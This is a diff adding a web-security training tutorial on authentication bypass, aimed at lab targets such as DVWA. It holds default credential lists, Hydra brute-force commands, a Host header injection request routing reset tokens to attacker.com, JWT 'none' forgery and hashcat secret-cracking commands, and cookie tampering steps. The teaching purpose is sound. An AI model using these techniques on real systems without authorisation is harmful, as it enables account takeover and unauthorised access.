@@ -1,0 +1,158 @@
+---
+title: "Tut04: Authentication Bypass"
+---
+
+Authentication is the mechanism that tells an application who you are. When it is poorly implemented, an attacker can log in without valid credentials, access other users' accounts, or elevate to administrative access without authorization.
+
+## Common Authentication Weaknesses
+
+| Weakness | Description |
+|---------|-------------|
+| Default credentials | Admin accounts with unchanged default passwords |
+| Weak password policy | Short, common, or guessable passwords allowed |
+| SQL injection in login | See SQLi tutorial |
+| Insecure session tokens | Predictable or unvalidated tokens |
+| Missing brute-force protection | No rate limiting, lockout, or CAPTCHA |
+| Broken password reset | Predictable tokens, user-controlled emails, no expiry |
+| JWT weaknesses | None algorithm, weak secret, algorithm confusion |
+
+## Default and Weak Credentials
+
+Always try default credentials before anything else:
+
+```
+admin / admin
+admin / password
+admin / 123456
+root / root
+root / toor
+user / user
+guest / guest
+```
+
+For web application management interfaces:
+
+| Application | Default Username | Default Password |
+|------------|-----------------|-----------------|
+| WordPress | admin | admin |
+| Tomcat Manager | tomcat | tomcat |
+| Jenkins | admin | admin |
+| phpMyAdmin | root | (empty) |
+| DVWA | admin | password |
+
+## Brute-Force with Hydra
+
+```sh
+# Brute-force HTTP login form
+hydra -l admin -P /usr/share/wordlists/rockyou.txt \
+  http-post-form "target.lab/login:username=^USER^&password=^PASS^:Invalid password"
+
+# Use a username list
+hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
+  http-post-form "target.lab/login:username=^USER^&password=^PASS^:Invalid password"
+```
+
+The third field (after the second colon) is the string that appears in the response when login **fails**.
+
+With Burp Suite Intruder:
+
+1. Capture a login request in Proxy.
+2. Send to Intruder (Ctrl+I).
+3. Set the attack type to **Cluster bomb**.
+4. Mark username and password fields as positions.
+5. Load wordlists for each position.
+6. Start attack and sort by response length (successful logins differ).
+
+## Broken Password Reset
+
+Password reset flows are often poorly implemented.
+
+### Weak Tokens
+
+If the reset link looks like `http://target.lab/reset?token=12345`, the token may be:
+- Sequential (try 12344, 12346).
+- Based on timestamp (try tokens generated at nearby times).
+- Based on username or email (try encoding variations).
+
+### Host Header Injection
+
+Some applications use the `Host` header to construct the reset link:
+
+```
+POST /forgot-password HTTP/1.1
+Host: attacker.com
+```
+
+The reset email is sent to the victim, but the link points to your server, delivering the token to you.
+
+Test by modifying the `Host` header in Burp Repeater.
+
+### Response Manipulation
+
+After submitting a wrong password, intercept the response in Burp. If the response contains `{"success":false}`, change it to `{"success":true}` and forward it. Some applications trust the client-side result.
+
+## JWT (JSON Web Token) Attacks
+
+JWTs are three base64url-encoded parts: header, payload, signature.
+
+```
+eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.SIG
+```
+
+Decode the payload:
+
+```sh
+echo 'eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9' | base64 -d
+# {"user":"alice","role":"user"}
+```
+
+### Algorithm None Attack
+
+Change the algorithm to `none` and remove the signature:
+
+```json
+{"alg":"none","typ":"JWT"}
+```
+
+Payload: change `"role":"user"` to `"role":"admin"`.
+
+```sh
+# Encode modified header
+echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '='
+# Encode modified payload
+echo -n '{"user":"alice","role":"admin"}' | base64 | tr -d '='
+# Combine with empty signature
+TOKEN="<new_header>.<new_payload>."
+```
+
+### Weak Secret Brute-Force
+
+```sh
+# Use hashcat to crack the JWT signing secret
+hashcat -a 0 -m 16500 <token> /usr/share/wordlists/rockyou.txt
+```
+
+Once you have the secret, forge tokens with any claims you like using [jwt.io](https://jwt.io).
+
+## Cookie and Session Weaknesses
+
+```sh
+# Decode a base64 session cookie
+echo 'dXNlcj1hZG1pbg==' | base64 -d
+# user=admin
+
+# Modify and re-encode
+echo -n 'user=administrator' | base64
+```
+
+Look for cookies that contain plain or encoded user data. If the server does not validate an HMAC or signature, you can modify the cookie freely.
+
+## Task
+
+> **[Task]** In DVWA, test the Brute Force module. Use Hydra to brute-force the admin account. Then examine the session cookie: is it predictable? Can you modify it? Try the password reset feature in another lab and check whether the reset token is guessable. Document each test and result.
+
+## Reference
+
+- [PortSwigger Web Security Academy - Authentication](https://portswigger.net/web-security/authentication)
+- [PortSwigger Web Security Academy - JWT Attacks](https://portswigger.net/web-security/jwt)
+- [OWASP Authentication Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
